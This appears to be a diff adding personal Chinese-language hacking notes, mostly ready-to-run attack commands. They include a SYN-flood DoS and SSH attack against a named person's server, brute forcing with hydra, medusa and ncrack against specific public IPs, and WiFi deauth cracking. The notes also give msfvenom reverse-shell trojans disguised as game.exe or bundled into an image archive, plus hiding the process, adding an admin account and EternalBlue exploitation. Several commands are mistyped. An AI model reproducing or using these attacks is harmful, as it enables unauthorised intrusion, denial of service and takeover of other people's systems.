@@ -1,0 +1,777 @@
+* 成果图：
+攻击米文博22号端口，协议ssh：
+
+[[./figure_network/mmexport1584403670237.jpg  ]]
+
+[[./figure_network/mmexport1584403673341.jpg]]
+
+利用局域网中不同的ip地址对米文博服务器发起DOS攻击，TCP二三次握手攻击：
+
+[[./figure_network/mmexport1584403676361.jpg]]
+* tor
+tor是一个匿名网络了路由器，起初由美国海军资助，\\
+xingxingstar@torbox3uiot6wchz.onion \\
+[[./figure_network/Tor-onion-network.png]]
+
+https://www.exploit-db.com/google-hacking-database
+
+https://www.torproject.org/download
+
+http://thehiddenwiki.org
+
+http://uzzz.org/201808/29/5f76d7216ee1be2fefb2881d5ef55578.html
+
+http://qkj4drtgvpm7eecl.onion
+
+http://newmap.norsecorp.com 
+
+http://22u75kqy1666joi2.onion
+
+http://reloadedudjtjvxr.onion/road.php 
+
+http://prnstmrpfkgkaw5v.onion 
+
+http://iuhcjx6fpeafstuu.onion 
+
+http://6soqvgf7mrjc7w3j.onion/bbs/index.php
+
+* information gathering
+** 被动收集
+*** 被动信息收集
+信息收集的方式可以分为两种:被动和主动\\
+被动信息收集的方式是指:利用第三方服务对目标进行访问了解.e.g:google搜索\\
+主动收集:通过直接访问,扫描网站,这种将流量流经网站的行为.比如:nmap扫描端口.\\
+被动信息收集的目的:通过公开渠道,去获得目标主机的信息,从而不与目标系统直接交互,避免留下痕迹.\\
+信息收集的内容:1.IP地址段2.域名信息3.邮件地址4.文档图片数据5.公司地址6.公司组织架构7.联系电话/传真号码8.人员姓名/职位9.目标系统使用的技术架构10.公开的商业信息\\
+信息用途:1.信息描述目标2.发现目标3.社会工程学攻击4.物理缺口
+
+*** 信息收集-DNS
+*** 域名解析原理
+1.DNS服务器概述:\\
+运行DNS服务器程序的计算机,存储DNS数据库信息.DNS服务器分为根域DNS服务器,顶级域名DNS服务器.根域DNS服务器有13个,都存储了全部顶级域名服务器所在地址;顶级域名服务器存储每位客户注册的主机地址,这里对应到163.com这个级别.https://wanwang.aliyun.com\\
+ctrl+ +放大字体\\
+ctrl+ l 清屏\\
+将域名解析为ip地址:\\
+1.ping \\
+2.nslookup url(cat /etc/resolv.conf) \\
+3.dig @114.114.114.114 url any(指定从114.114.114.114开始解析)\\
+dig +noall +answer @8.8.8.8 any
+
+查询ip对应的域名:\\
+1.dig -x ip 
+
+查询dns版本:\\
+dig txt chaos VERSION.BIND @ip\\
+目的:可以通过版本信息来查找相关版本漏洞的利用方式
+
+查询网站的注册信息以及备案信息\\
+https://whois.aliyun.com  \\
+whois url \\
+*** 子域名信息收集
+主域:baidu.com 主域下可以有很多二级三级域名edu.baidu.com,abc.baidu.com
+1.子域名挖掘机:maltego
+2.google搜索: site:qq.com 
+3.第三方网站查询:http://tool.chinaz.com/subdomain,http://dnsdumpster.com 
+注册maltego CE
+https://www.paterva.com/web7/community/community.php
+*** shodan信息收集
+https://www.shodan.io
+shodan搜索技巧:
+1.在搜索框输入:webcam(打开别人的摄像头)or city:beijing webcam
+按滑轮会再次打开一个标签页
+没有验证码可以暴力破解
+
+2.net:ip 搜索该网站的所有漏洞(Vulnerabilities)
+
+3.port:80(列出开80端口的服务器)port:9200(elk日志)
+
+4.port:3000(查找登录窗口)
+
+5.city:beijing(查看北京联网的服务器),可以多个命令组合
+*** google搜索引擎的使用
+inurl:qq.txt(限定在url中搜索)
+inurt:admin_login.asp(含有登录界面)
+intitle:index.of .bash_history(index.of出现该字段表示,网站目录对我们是开放的,我们可以查看到网站目录下所有文件信息,.bash_history表示要查看的文件名称,该文件记录了历史命令)
+查找mysql配置文件
+cache:域名(cache返回结果是被搜索引擎收录时的界面,比如一些页面被删了,我们通过cache仍可访问)
+kali filetype:torrent(kali关键字,filetype文件的后缀,语言选为英语,关闭安全搜索搜到的东西会更多)
+apache site:bbs.xuegod.cn (apache是关键字,size可以查询网站的收录情况,bbs.xuegod.cn目标网站.当站内搜索不好用时可用此方法代替站内搜索)
+组合技巧:
+intext:user.sql intitle:index.of (查询包含user.sql用户数据库信息的页面,)
+** 主动收集
+*** 主动收集的原理
+扫描发送不同的探测,根据返回结果判断目标状态.
+
+发现目标主机的过程:
+1.识别存活主机,发现潜在的被攻击目标
+2.输出一个IP地址列表,比如IP地址段, IP地址范围
+3.使用二三四层进行探测发现
+基于OSI模型进行扫描的优缺点:
+1.二层扫描速度快,可靠.缺点不可路由
+2.三层可路由速度快,缺点速度比二层慢,经常被边界防火墙过滤,使用IP,icmp协议
+3.四层:可路由切结果可靠,不太可能被防火墙过滤,可以发现所有端口都被过滤的主机.缺点,基于状态过滤的防火墙可能过滤扫描,全端口扫描速度慢
+*** 使用ping探测服务器存活-用Hping3对服务器产生DOS攻击
+ping命令是我们常用的判断主机之间是否畅通,ping ip -c 1(发一个ping包就停止)
+Traceroute命令也可以对路由进行跟踪.
+arping命令得到ip对应的mac地址(如果出现两个mac地址对应一个ip地址,就是arp欺骗)
+arping -c 1 192.168.1.1 | grep 'bytes from' | cut -d '' -f 5 | cut -d '(' -f 2 |cut -d ')' -f 1 
+arping对整个网络进行扫描脚本:
+#!/bin/bash
+if["$#" -ne 1];then  #判断用户是否输入了至少一个参数,如果没有输入参数,提示输出信息并退出
+  echo "Usage - ./arping.sh [interface]"
+  echo "Excample - ./arping.sh eth0"
+  echo "Example will perform an ARP scan of the local subnet to which eth0 is assigned"
+  exit
+fi
+  interface=$1 #将用户输入的参数传递给interface变量
+prefix=$(ifconfig$interface|grep "inet" | cut -d '-t' -f 2 | cut -d '.' -f 1-3)#获取本机IP地址网段192.168.1 
+#对整个网段进行arping
+for addr in $(seq 1 254);do 
+  arping -c 1 $prefix.$addr |grep "bytes from" | cut -d "" -f 5 |cut -d "("-f 2 |cut -d")" -f 1 
+done
+chmod -x arping.sh 
+./arping.sh eth0
+可以探测出来具有网有那些机器
+
+*Netdiscover* 是一个主动/被动的ARP侦查工具.使用Netdisconver工具可以在网络上扫描IP地址,检查在线主机或搜索为它们发送的ARP请求.
+主动模式:主动的探测发现网络内的主机,但是这种方式往往或 *引起网络管理员* 的注意
+netdiscover -i eth0 -r 192.168.1.0/24 (-i device:your network device ;-r range:scan a given range instead of auto scan.192.168.6.0/24,/16,/8)
+
+被动模式方法更加隐蔽,但是速度比较慢,网卡被设置为 *混杂模式来帧听网络内的arp数据包* 进行被动式探测,这种方式就需要网络内设备发送arp包才能探测到,网络中服务器没有发ARP广播包,所以探测不到
+netdiscover -p (passive)
+
+Hping3是一个在命令行下使用的TCP/IP数据包组装/分析工具,通常web服务会用来做压力测试,也可以进行DOS攻击实验.同样Hping只能每次扫描一个目标.
+hping3 -c 1000 -d 120 -S -w 64 -p 80 --flood --rand-source url(-c 1000次, -d 120一个包大小,-S发包类型SYN,-w TCP的滑动窗口,-p 80端口,洪水攻击,不同的源)
+关闭:pkill hping 
+
+*** 基于Nmap的扫描方式
+基于半连接的扫描不会留下记录,速度快
+nmap -sS ip(扫描该ip开放的全部端口)
+nmap -sS ip -p 80,81,21,25,110,443 (-sS表示使用SYN进行半连接扫描)
+nmap -sS ip -p 1-65535 (指定扫描端口的范围)
+nmap -sS ip/24 -p 1-65535(扫描一个网段)<==>nmap -sS ip/24 -p -
+nmap -sn ip/24 or nmap -sn 192.168.1.1-254(表示只ping,不进行端口扫描)
+nmap ip -p 80 (查看目标主机的80端口是否开放,全连接扫描)
+nmap ip --top-ports 10 最常用的10个端口 --open 只显示开放的端口 --reason 显示判断端口开放的原因 -e eth0指定发包网卡 -n 不需要反向查询(反向查询指给定一个域名,解析为ip,在解析该ip存在那些域名) --traceroute路由跟踪
+
+nmap iL file.txt (文本文件中存放的是一系列不连续的ip)
+nmap 192.168.0.0/16 --exlude 192.168.23.0/24 排除某段IP
+nmap 192.168.0.0/16 --exludefile ex.txt 
+
+
+主机发现(先是主机发现然后是端口扫描)
+- 嗅探帧听被动发现(NSE)
+- -sn:TCP ping扫描(TCP80/443 ACK/SYN扫描,sYN+ACK/RST+ACK)
+- -Pn:跳过主机发现(--traceroute,negative)
+- -PS/PA/PU/PY[portlist]:SYN/ACK/UDP/SCTP
+- -PE/PP/PM/PO:ICMP,Timestamp,Network IP协议号
+- --dns-servers 8.8.8.8,4,4,4,4
+
+nmap -O ip 扫描操作系统
+--randomize-hosts随机扫描
+--scan-delay延时扫描
+/usr/share/nmap/scrip 
+--script
+
+nc扫描端口
+nc的作用:
+1.实现任意TCP/UDP端口的倾听,nc可以作为server以TCP或UDP方式倾听指定端口
+2.端口扫描,nc可以作为客户端发起TCP或UDP连接
+3.机器之间传输文件
+4.机器之间网络测速
+nc参数:-nv表示我们扫描的目标是个IP地址不做域名解析
+-w 表示超时时间
+-z 表示进行端口扫描
+nc -nv -w 1 -z 192.168.1.1 1-100
+*** 全连接扫描
+3次握手
+*** 使用Scapy定制数据包进行高级扫描
+scapy 是一个可以让用户发送,帧听和解析并伪装网络报文的python程序.这些功能可以用于制作侦测,扫描和攻击网路的工具.
+使用:ARP.display()查看ARP函数的使用方法
+  hwtype= 0x1
+  ptype= 0x800
+  hwlen= 6
+  plen= 4
+  op= who-has
+  hwsrc= 18:1d:ea:4d:b7:82
+  psrc= 192.168.1.77
+  hwdst= 00:00:00:00:00:00
+  pdst= 0.0.0.0
+
+1. 定制ARP包
+例:定义向192.168.1.1发送arp请求的数据包,询问192.168.1.1的MAC地址
+sr1函数的作用:发送数据包和接收数据包的功能
+sr1(ARP(pdst="目标ip"))
+
+2. 定制ping包
+IP().display()
+ICMP.display()
+使用以上两个函数可以生成ping包进行探测.IP()生成源IP和目标IP,ICMP()生成ping包的类型.思路:1.修改IP包头的dst,也就是我们的目的地址,2.然后拼接上ICMP的数据包类型,3.最后使用sr1函数发送即可.
+sr1(IP(dst="192.168.1.1")/ICMP(),timeout=1)
+查看数据包格式和用法()
+  version= 4
+  ihl= None
+  tos= 0x0
+  len= None
+  id= 1
+  flags= 
+  frag= 0
+  ttl= 64
+  proto= hopopt
+  chksum= None
+  src= 127.0.0.1
+  dst= 127.0.0.1
+  \options\
+
+  type= echo-request
+  code= 0
+  chksum= None
+  id= 0x0
+  seq= 0x0
+3. scapy定制TCP协议SYN请求
+TCP().display()
+sr1(IP(dst="192.168.1.1")/TCP(flags="S",dport=80),timeout=1),flags="S"表示SYN数据包,dport=80 表示目标端口80,得到一个flags=SA的数据包.SA标志即SYN+ACK表示端口开放.
+
+###[ TCP ]### 
+  sport= ftp_data
+  dport= http
+  seq= 0
+  ack= 0
+  dataofs= None
+  reserved= 0
+  flags= S
+  window= 8192
+  chksum= None
+  urgptr= 0
+  options= {}
+
+4. scap定制UDP协议
+UDP协议是不可靠的,没有收到回应包表示端口开放,收到回应包表示端口不开放,或者是非UDP端口.
+UDP().display()
+sr1(IP(dst="ip")/UDP(dport=53),timeout=2)
+
+###[ UDP ]### 
+  sport= domain
+  dport= domain
+  len= None
+  chksum= None
+*** 开启超级扫描之僵尸扫描
+僵尸扫描拥有极高的隐蔽特性,但是实施条件苛刻.
+1.目标网络可伪造源地址进行访问
+2.选择僵尸机,僵尸机需要在互联网上是一个闲置的操作系统,需要系统使用递增的IPID,比如XP系统或Android手机.
+nmap和ping都会直接和目标机接触.
+
+第一步:(黑客的收获是:知道了僵尸主机的IPID)
+(1) 攻击者向僵尸机发送SYN/ACK确认包
+(2) 僵尸主机返回RST(数据包关闭连接,RST数据包中包含了IPID信息.)
+rz1=sr1(IP(dst='192.168.1.54')/TCP(dport=445,flags="SA"))
+
+
+第二步:(如果目标主机开放,让僵尸主机的IPID+1)
+(1) 攻击者修改IP包头的SRC字段为僵尸主机的IP,伪装僵尸主机给目标主机发SYN
+(2) 目标主机收到请求,如果端口开放就会给僵尸主机一个SYN/ACK数据包
+(3) 僵尸主机收到目标主机发来的SYN/ACK确认包,因为僵尸主机没有给目标主机发SYN请求,所以僵尸主机给目标主机返回了一个RST数据包.这个数据包表示关闭连接.此僵尸主机发送了一个RST数据包,所以IPID值+1.此时IPID值为X+1.
+rt=src1(IP(src='192.168.1.54',dst='182.168.1.63')/TCP(drop=22),timeout=1)
+
+第三步:(重新给僵尸主机发SYN/ACK数据包,发现IPID若是为X+2,则目标主机上某端口开放)
+rz2=sr1(IP(dst='192.168.1.54')/TCP(dport=445,flags="SA"))
+
+
+nmap僵尸扫描:
+nmap 192.168.1.0/24 -p1-1024 --script=ipidseq.nse >a.txt,--script判断主机是否可以当做僵尸机 >a.txt输出到a.txt 
+netdiscover显示局域网中网络设备
+** parsero
+访问rebots.txt(与搜索引擎爬虫的约定)
+www.baidu.com/rebots.txt 
+parsero -u url
+-o:只显示状态200的结果
+-sb：bing搜索rebots.txt文件中的url
+** irpas-ass 
+Internet router Protocol attack suite--autonomous system scanner(根据路由协议脆弱性开发.)
+互联网数字资源:ip地址,ASN
+
+
+1. 主动模式
+主动发路由协议包
+ass -i eth0 -A
+2. 被动模式 
+帧听路由协议的广播或者组播包
+优点是隐蔽
+ass -i eth0
+-S 指定源地址
+-D 指定目标地址
+-P 指定协议
+
+3.互联网ddos使用相邻AS地址攻击目标
+路径追踪 Public AS 
+lft -A ip 
+
+IANA委托Internet数字资源给5大RIR
+Internet Assigned Numbers Authority(IANA)
+regional Internet Registry(RIR)
+负责管理,分配,注册互联网数字资源组织
+5个RIR加入了Number Resource Organization(NRO)
+彼此协调配合的全球非法人实体机构(技术项目,联合协调)
+RIR再分配给下级用户(ISP,企业,教育机构)
+
+一个AS具有统一的路由策略(同一个管理机构)
+AS内部(内部路由协议)
+  - 使用ip路由,路由器之间彼此交换路由信息
+  - IGP(内部网关协议):RIP,OSPF,EIGRP,IS-IS,IGRP
+AS间通信(外部路由协议)
+  - 使用IP路由,内部IP路由外部不可见
+  - EGP:BGP(V4),IDRP(未来)
+  - 信息传递不是技术问题,更多的是商业和政治问题.
+
+Tier 1 ISP通常peer彼此不收费(ISP之间)
+Tier 2 付费购买连接(大部分上网用户)
+Internet是大量大的Tier 1 ISP peer的互联结果
+* wireshark
+** wireshark简介和抓包原理及过程
+wireshark使用winpcap作为接口,直接与网卡进行数据交换.
+1. 确定wireshark的位置.如果没有一个正确的位置,启动wireshark后会花费很长时间捕获一些与自己无关的数据.
+2. 选择捕获接口.一般都是选择到Internet网络的接口,这样才可以捕获到与网络有关的数据,否则,捕获到的其他数据对自己也没有任何帮助.
+3. 捕获过滤器.通过设置捕获过滤器,可以避免产生过大的捕获数据.这样用户在分析数据时也不会受其他数据干扰.
+4. 使用显示过滤器.通常使用捕获过滤器过滤后的数据,往往还是很复杂.为了使用过滤数据的数据包再更细致,此时使用显示过滤器进行过滤.
+5. 使用着色规则.通常使用显示过滤器过滤后的数据,都是有用的数据包.如果想更加突出的显示某个会话,可以使用着色规则高亮显示.
+6. 构建图表,如果用户想要更明显的看出一个网路中数据的变化情况,使用图表的形式可以很方便的展现数据的分布情况.
+7. 重组数据.当传输较大的图片或文件时,需要将信息分布在多个数据包中.这时就需要使用重组数据的方法来抓区完整的数据,wireshark的重组功能可以重组一个会话中不同数据包的信息,或者重组一个完整的图片或文件.
+** 实战:wireshark抓包及快速定位数据包包技巧
+常见协议包:
+ARP:通过网络地址定位MAC地址,数据链路层网络传输协议. 
+ICMP:
+TCP 
+UDP 
+
+DNS 
+HTTP 
+FTP 
+混杂模式:混杂模式就是接收所有经过网卡的数据包,包括不是发给本机的包,即验证MAC地址.普通模式下网卡只接收发给本机的包,传递给上层程序,其它的包一律丢弃.
+filter:ip.src_host==192.168.1.1 or ip.dst_host
+** 使用wireshark对常用协议抓包并分析原理
+** wireshark抓包解决服务器被黑上不了网
+安装mtr可以分析路由节点:用法:mtr ip
+* miranda
+主动/被动发现,查询,管理UPnP设备
+基于Python开发
+独立的命令行界面
+- 命令行自动补齐,历史命令
+- 定制SSDP头
+- 定制网卡,IP,端口
+
+help查看使用说明
+seti show   查看默认的组播地址和端口,network Interface,确定要使用的网卡
+seti iface eth0 定制网卡为eth0
+seti socket 233.255.255.250:1900,(修改组播地址和端口)
+
+
+被动:pcap 
+pcap
+不断的向路由器发送UPnP组播数据包(SSDP通告自己存在)
+
+主动:msearch
+msearch主动向网络中发送一个组播数据包(SSDP)
+
+路由器返回的包中的XML信息,与主动发包的XML信息相同
+
+host list (发现的设备都会一一列出)
+host get 0 
+host summary 0 
+host info 0 deviceList(查看0设备支持的设备类型)
+host info 0 deviceList WANConnectionDevice services 
+host info 0 deviceList WANConnectionDevice services WANIPCConnection actions
+
+host send 0 WANConnectiondevice WANipcconnection AddPortMapping
+添加端口映射描述
+设定时间参数
+客户机的ip地址
+开启 
+映射到外网的端口(通过该端口访问该硬件)
+允许的外网访问的地址有哪些(不输代表全部外网地址)
+TCP 
+内网的端口80
+127.0.0.1/80 
+
+查询外网ip地址:
+host sent 0 WANConnectiondevice WANIPcconnection GETExternalIPAddress
+外网地址/9898
+
+host sent 0 WANconnectiondevice WANIPCconnection GetSpecificPortMappingEntry
+
+
+攻击不限于内网,XSS+SOAP Payload远程漏洞利用
+
+针对UPnP协议的扫描和攻击工具
+Universal Plug and Play(UPnP)是一组网络协议
+- 适用于家庭网络(无企业级产品)
+- 便于设备间无缝发现和连接,建立基本的家庭网络服务(热插拔)
+文件共享,娱乐,通信
+IGD,打印机,智能电话,网络摄像头,电视盒子,洗衣机,冰箱,烤箱
+SSDP:Simple Service Discovery Protocol (设备之间彼此发现,文件共享通信)
+GENA:Generic Event Notification Architecture(通告本网络存在,以便其他的设备彼此发现)
+SOAP:Simple Object Access Protocol (发送合法指令的数据包,设备就会更改修改配置的效果)
+XML:Extensible Markup Language
+
+特点:
+基于IP的通信协议
+无任何身份验证机制
+大部分路由器支持UPnP且默认启动
+大量设备可利用UPnP修改配置
+爆破路由器密码不是好主意,UPnP可以修改DNS配置,修改密码,端口转发,动态DNS,重启DNS,重启设备,窃取PPPoE账号,查看或修改无线配置
+
+UPnP工作过程
+1. 获取地址(默认基于IP协议)
+2. Discovery 
+REQUEST:M-SEARCH(239.255.255.250/UDP 1900)组播地址,端口1900
+RESPONSE:单播回包,包含XML URL(Location头)
+3. NOTIFY
+通告自己的存在,239.255.255.250/UDP 1900
+包含xml URL(Location头)
+4. http over UDP 
+
+5. Description
+读取XML文件内容
+Device type
+service
+Action
+Variable
+
+6. Control
+Device+service+action+Variable
+以上通信通过SOAP请求实现
+
+* attack
+** acccheck
+密码破解工具
+SMB协议分析工具(server message block)，又称网络文件共享系统，一种应用层网络传输协议，由微软开发，主要功能是使网络上的机器能够共享计算机文件，打印机，串行端口。
+- TCP445端口
+- MS08-067
+- WannaCry
+
+尝试连接：
+IPC&
+ADMIN&
+windows打开显示共享文件：命令行输入-->"et share"
+设置账号密码：net user administrator 123456
+
+
+参数：
+t/T:traget -t target_IP -T target_IP_file.txt 
+u/U:user
+p/P :passwd
+-v:显示破解信息
+
+** crunch hydra
+查看：man crunch
+生成字典：crunch 1 4 charset.lst lalpha -o mypasswd.txt(生成length1-4的字典输出到mypasswd.txt)
+
+破解：hydra -l root -w 10 -P mypasswd.txt -t 14 -v ip ssh(-l指用户名(如果不知道用户名，可以-L user.txt指定用户名字典)，-w指定超时，-v指定显示破解过程信息，ip，以及破解协议,-t 线程数)
+
+hydra -l ubuntu -w 10 -P -t 14 -v ip ssh -o text.ok
+或者hydra -l ubuntu -w 10 -P -t 14 -v rdp://ip -o text.ok
+
+-M(添加多个主机) ftp://49.233.64.251:22  ip 域名 ftp://[127.0.0.1/24]/ 
+-e ns 空密码试探
+
+在线破解：直接破解，离线破解：本地破解
+** medusa
+Medusa是支持AFP, CVS, FTP, HTTP, IMAP, MS-SQL, MySQL, NCP (NetWare),
+NNTP, PcAnywhere, POP3, PostgreSQL, rexec, rlogin, rsh, SMB, SMTP
+(AUTH/VRFY), SNMP, SSHv2, SVN, Telnet, VmAuthd, VNC的密码爆破工具。
+Medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]
+
+medusa -M http -h 49.233.64.251 -u CHen -p 123 -t 14 -O mwb.txt -f 
+
+-h [TEXT]      目标IP
+-H [FILE]      目标主机文件
+-u [TEXT]      用户名
+-U [FILE]      用户名文件
+-p [TEXT]      密码
+-P [FILE]      密码文件
+-C [FILE]      组合条目文件
+-O [FILE]      文件日志信息(指定输出文件)
+-e [n/s/ns]    N意为空密码，S意为密码与用户名相同
+-M [TEXT]      模块执行名称，例如，-M ssh 攻击ssh模块 -h是目标IP
+-m [TEXT]      传递参数到模块
+-d             显示所有的模块名称
+-n [NUM]       使用非默认端口
+-s             启用SSL
+-r [NUM]       重试间隔时间，默认为3秒
+-t [NUM]       设定线程数量
+-L             并行化，每个用户使用一个线程
+-f             在任何主机上找到第一个账号/密码后，停止破解
+-q             显示模块的使用信息
+-v [NUM]       详细级别（0-6）
+-w [NUM]       错误调试级别（0-10）
+-V             显示版本
+-Z [TEXT]      继续扫描上一次
+
+** brutespray
+安装apt update&&apt install brutespray
+-f file 
+-o containing successgul attempts
+-s specify service to attack
+-t threads
+-T hosts
+-U userlist
+-P passlist
+-c 成功之后继续爆破
+-i 交互模式
+
+nmap  -v ip/24 -oX nmap.xml(-v显示详细信息，ip/24一个网段的信息，-oX输出为xml文件)
+namp -A -p22 -v ip/24 -ox 22.xml(-A 所有参数，-p22 22号端口，包括操作系统的信息) 
+nmap --help | grep ‘\-s’
+nmap -sP ip/22 -oX nmap.xml(-sP ping的方式)
+nmap -sV -O ip/22 -oX nmap.xml(-O操作系统信息)
+brutespray -f 22.xml -u ubuntu -P pass.txt -t 20 -T 5(-T 5 表示该网段中的5个主机)
+/root/brutespray-output/ssh-sucess.txt (在该文件中查看成功爆破文件)
+** ncrack
+ncrack [Options] {target and service specification}
+
+ncrack [选项] {目标和服务规格}
+
+ncrack --user frp316 --pass 1234 frp://ip
+
+-U <文件名>：用户名文件
+
+-P <文件名>：密码文件
+
+--user <username_list>：逗号分隔的用户名单
+ncrack  --user  用户名  -P  /root/桌面/pass.txt  ftp://000.000.000.000
+--pass <password_list>：逗号分隔的密码列表
+
+--passwords-first：迭代每个用户名的密码列表。默认是相反的。
+
+--pairwise：成对选择用户名和密码。
+
+FTP，SSH，Telnet，HTTP（S），POP3（S），SMB，RDP，VNC，SIP，Redis，PostgreSQL，MySQL
+** john
+破解加密文件
+zip --password 123456 pojie.zip 1.txt (首先生成加密文件)
+zip2john pojie.zip 
+zip2john pojie.zip > hash.txt 
+john pojie.zip hash.txt 
+
+更多信息：http://tools.kali.org/password-attacks/john
+https://www.openwall.com/john
+
+http://hxtop1.tk
+
+查看系统默认字典：cat /usr/share/john/password.lst |more 
+--wordlist参数调用字典文件
+
+查看linux用户的hash值：cat /etc/shadow
+将hash值创建一个文件
+jonh ./hash
+
+--show参数查看结果
+** 破解wifi密码
+iwconfig：查看网卡是否开启
+airmon-ng check ：开启监听模式
+airmon-ng start wlan0 
+选择攻击对象：
+airodump-ng wlan0mon
+记录对象的MAC地址封包
+airodump-ng --bssid mac地址 --channel 8 --write /root/sample wlan0mon(会生成sample.cap)
+在创建一个终端窗口aireplay-ng(注入数据包) -0表示取消认证数据包 5表示攻击次数，0表示无限次攻击
+aireplay-ng -0 5 -a MAC地址 wlan0mon 
+当找打目标时左上角会出现：WPA handshake
+aircrack-ng /root/sample.cap -w /root/Documents/kali/dict.txt 
+
+wifiphisher
+** 密码生成
+*** cewl
+Cewl是一款采用Ruby开发的应用程序，你可以给它的爬虫指定URL地址和爬取深度，还可以添额外的外部链接，接下来Cewl会给你返回一个字典文件，你可以把字典用到类似John the Ripper这样的密码破解工具中。除此之外，Cewl还提供了命令行工具。
+
+输入下列命令之后，爬虫会根据指定的URL和深度进行爬取，然后打印出可用于密码破解的字典
+cewl http://www.ignitetechnologies.in/
+
+为了方便大家记录，或者为将来的研究提供参考，Cewl可以将打印出的字典存储为文件。这里可以使用-w参数来将密码字典存储为text文件：
+cewl http://www.ignitetechnologies.in/ -w dict.txt
+
+如果你想生成指定长度的密码字典，你可以使用-m选项来设置不低于9位的密码：
+cewl http://www.ignitetechnologies.in/ -m 9
+
+如果你想要计算目标网站中某个词的重复出现次数，你可以使用-c选项来开启参数计算功能：
+cewl http://www.ignitetechnologies.in/ -c
+
+cewl http://www.ignitetechnologies.in/ -d 3
+如果你想增加爬虫的爬取深度以生成更大的字典文件，你可以使用-d选项来指定爬取深度，默认的爬取深度为2：
+
+你可以使用–debug选项来开启调试模式，这样就可以查看网站爬取过程中出现的错误和元数据了：
+cewl http://www.ignitetechnologies.in/ --debug
+
+为了扩展网站爬取结果，并获取更加完整的数据报告，你可以使用-v选项来进入verbose模式。该模式下，Cewl会导出目标网站的详细数据：
+cewl http://www.ignitetechnologies.in/ -v
+
+如果你想生成包含数字和字符的字典文件，你可以在命令中使用–with-numbers选项：
+cewl http://testphp.vulnweb.com/ --with-numbers
+
+如果目标网站需要进行页面登录认证的话，我们就要使用下列参数来绕过页面认证的限制：
+–auth_type:                      Digest or basic.
+–auth_user:                     Authentication username.
+–auth_pass:                     Authentication password.
+cewl http://192.168.1.105/dvwa/login.php --auth_type Digest --auth_user admin--auth_pass password -v
+或者cewl http://192.168.1.105/dvwa/login.php --auth_type basic --auth_user admin--auth_pass password -v
+*** crunch
+生成一个字典文件，用自己指定的字符（默认为26个小写字母为元素的所有组合）
+   crunch 1 3 123
+
+若字典中需要空格，;等用双引号来表示
+   crunch 3 3 "ab "
+
+生成几个元素的组合（可以用于社工中收集的信息）
+    crunch 4 4 -p zhangsan 2018 0101 ..
+
+生成指定的字符串（比如生成编号，手机号等）
+    crunch 10 10 -t 201800%%%%
+
+多种组合 生成3个元素的组合，前三位为定义的字符串
+    crunch 3 3 -t d@% -p aaa bbb 
+
+通过-l参数来使@,%^等特殊字符输出
+    crunch 7 7 -t p@ss,%^ -l a@aaaaa
+
+-o参数也可使用>>来简化
+    crunch 4 4 -d 2@ -t @@@% >> test.txt
+
+调用密匙库：
+cat /usr/share/crunch/charset.lst
+     numeric     表示0123456789
+     Lalpha      表示26位小写字母
+     Ualpha      表示26位大写字母
+
+(其中%代表所有的数字,@代表所有的小写字母,逗号代表所有大写字母)
+实例：调用密码库 charset.lst中的 hex-upper项目字符，生成4位密码，其中格式为@ + hex-upper +% +%
+runch 4 4 -f charset.lst hex-upper -t @@%% -l @xdd
+* web渗透
+# 123.56.218.102 
+
+** sql 注入
+*** get 注入：
+sqlmap -u "url"                        ==>检测
+sqlmap -u url --dbs                  ==>数据库
+sqlmap -u url --table -D 数据库名    ==>表
+sqlmap -u url --columns -T 表名 -D 库名  ==>字段
+sqlmap -u url --dump -T 表名 -C 字段 ==>字段内容
+*** post 注入：
+sqlmap -u url --data "sid=12"--dbs 
+sqlmap -u "url" --data "sid=12" --password
+* meteploit
+启动：
+sudo msfdb init && msfconsole
+更新：
+msfupdate
+
+端口扫描：nmap -v -sV url
+
+搜索框架相关的模块：search portscan
+进入模块：use auxiliary/sanner/portscan/syn
+展示选项：show options
+设置网卡设置扫描的端口：set INTERFACE eth0 && set PORTS 22 && set RHOSTS 49.233.64.251 (more hosts 49.233.64.0/24) && set THREADS 100
+run 
+
+获取系统信息：
+use auxiliary/scanner/smb/smb_version  
+
+服务识别：
+use auxiliary/scanner/ssh/ssh_version
+
+密码嗅探：
+use/auxiliary/sniffer/psnuffle
+
+SNMP 扫描
+use auxiliary/scanner/snmp/snmp_login
+use auxiliary/scanner/snmp/snmp_enum
+
+smb登录验证
+use auxiliary/scanner/smb/smb_login
+
+vnc身份识别
+use auxiliary/scanner/vnc/vnc_none_auth
+
+生成木马：
+毒液木马：
+msfvenom -p windows/meterpreter/resverse_tcp LHOST=ip LPORT=port  -f exe>game.exe(LHOST是本机的ip地址，LPORT是随机一个port,若是使用内网穿透的方法，ip设置为公网主机的ip，端口设置为公网主机开的tcp端口)
+将/game.exe 放到/html的根目录下
+
+进入 msfconsole
+
+use exploit/multi/handler
+
+exploit(开始捕获)
+set payload windows/meterpreter/reverse_tcp
+set LPORT 刚才随机的端口(set LHOST 127.0.0.1)
+
+登录另一个网站：ip/game.exe 下载文件
+
+然后目标已经生效：
+sysinfo(查看目标主机的系统信息)
+screenshot(查看入侵电脑的界面)默认在/root文件夹中
+run getgui -e(开启3389)
+
+隐藏game.exe
+ps 查看进程
+migrate 2382(game.exe的进程号)
+
+创建用户:
+shell
+net user admin Passw0rd /add (创建用户)
+net LOCALGROUP administrator admin /add (添加特权)
+
+
+在kali中：
+rdesktop -f -a 16 192.169.1.131:3389 
+rdesktop -u xxx -p xxx ip/port
+
+实时监控主机：run vnc 
+
+执行计算器： execute -f calc.exe
+
+捆绑：
+选中图片和文件添加到压缩文件：创建自解压文件->高级->自解压选项->设置->提取后执行‘back.exe,linuxjpg’
+
+
+android device 
+msfvdenom -p android/meterpreter/reverse_tcp LHOST=ip LPORT=port > R /var/www/html.apk 
+
+use exploit/multi/handler 
+set payload android/meterpreter/reverse_tcp
+show options
+set LHOST ip 
+set LPORT port 
+exploit
+
+background
+sessions
+sessions -i 1 
+help 
+sysinfo
+
+攻击445端口：
+设置网卡设置扫描的端口：
+use auxiliary/smb/smb_ms17_010 
+use auxiliary/sacnner/smb/smb_ms17_010 
+set RHOST ip (扫描靶机是否开启端口，)
+
+use exploit/windows/smb/ms17_010_eternalblue 
+set rhosts 设置攻击目标ip
+exploit 
+
+pdf漏洞：
+search cooltype_sing
+123.56.218.102
+* useage
+medusa 
+john
+aircrack
+nmap
+hping3 
+proxychains
+msf 
+* 下周计划
+1. 分布式爬虫
+2. 分布式暴力解密码
+3. 防御
+4. shell脚本
+5. 攻击局域网某台机器
